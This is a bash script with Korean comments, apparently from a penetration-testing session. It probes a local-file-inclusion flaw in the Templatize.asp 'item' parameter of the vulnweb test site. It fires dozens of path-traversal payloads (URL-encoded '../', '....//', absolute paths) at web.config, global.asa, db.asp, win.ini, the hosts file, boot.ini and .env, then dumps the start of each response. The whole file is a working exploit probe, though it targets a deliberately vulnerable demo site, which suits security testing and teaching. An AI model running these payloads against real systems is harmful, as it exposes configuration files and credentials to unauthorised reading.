#!/usr/bin/env bash
# Round 5 — Templatize.asp?item= LFI 재현 + 추가 민감 파일 읽기 (읽기 전용)
# 재실행 가능. 출력: probe_templatize.txt + out/ 디렉터리 원문
set -u
BASE="http://testasp.vulnweb.com"
D="$(cd "$(dirname "$0")" && pwd)"
OUT="$D/out"; mkdir -p "$OUT"
CURL=(curl -s --noproxy '*' --max-time 25)

probe() { # $1=label  $2=item 값(그대로 URL 에 들어감)
  local label="$1" item="$2"
  local code size
  read -r code size < <("${CURL[@]}" -o "$OUT/tpl_${label}.html" -w "%{http_code} %{size_download}" \
      "$BASE/Templatize.asp?item=$item")
  printf "%-28s %-40s %s %s\n" "$label" "$item" "$code" "$size"
}

echo "### A. Templatize.asp?item= — 파라미터/경로 변형 (읽기 전용)"
printf "%-28s %-40s %s %s\n" "LABEL" "ITEM" "CODE" "SIZE"
probe baseline_noparam        ""            # (실제로는 ?item= 빈값)
probe item_empty              ""
probe known_good              "html/about.html"
probe db_asp                  "db.asp"
probe loginput_asp            "logInput.asp"
probe templatize_self         "Templatize.asp"
probe default_asp             "Default.asp"
probe search_asp              "Search.asp"
probe login_asp               "Login.asp"
probe showthread_asp          "ShowThread.asp"
probe showforum_asp           "ShowForum.asp"
probe shownews_asp            "shownews.asp"
probe register_asp            "Register.asp"
probe web_config              "web.config"
probe global_asa              "global.asa"
probe abs_webconfig           "/web.config"
probe abs_globalasa           "/global.asa"
probe dot_webconfig           "./web.config"
probe slash_db_asp            "/db.asp"
probe dotdot_plain            "../db.asp"
probe dotdot_enc              "..%2fdb.asp"
probe dotdot_pct2e            "%2e%2e/db.asp"
probe html_dotdot_webconfig   "html/../web.config"
probe html_dotdot_dbasp       "html/../db.asp"
probe dotdot4_winini          "..%2f..%2f..%2f..%2fwindows%2fwin.ini"
probe dotdot4_hosts           "..%2f..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts"
probe dotdot8_winini          "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini"
probe dotdot_upper            "..%2F..%2F..%2F..%2Fwindows%2Fwin.ini"
probe dotdot_plain_slash      "../../../../windows/win.ini"
probe abs_winini              "/windows/win.ini"
probe dotdot_dotdot_slash     "....//....//....//....//windows/win.ini"
probe dotdot4_bootini         "..%2f..%2f..%2f..%2fboot.ini"
probe dotdot6_dotenv          "..%2f..%2f..%2f..%2f..%2f..%2f.env"
echo
echo "### A2. 응답 본문 첫 12줄 (원문 확인용)"
for f in db_asp loginput_asp templatize_self shownews_asp web_config global_asa \
         abs_webconfig html_dotdot_webconfig dotdot4_winini dotdot4_hosts dotdot6_dotenv; do
  echo "--- $f ---"
  head -c 600 "$OUT/tpl_${f}.html" 2>/dev/null | sed -n '1,12p'
  echo
done
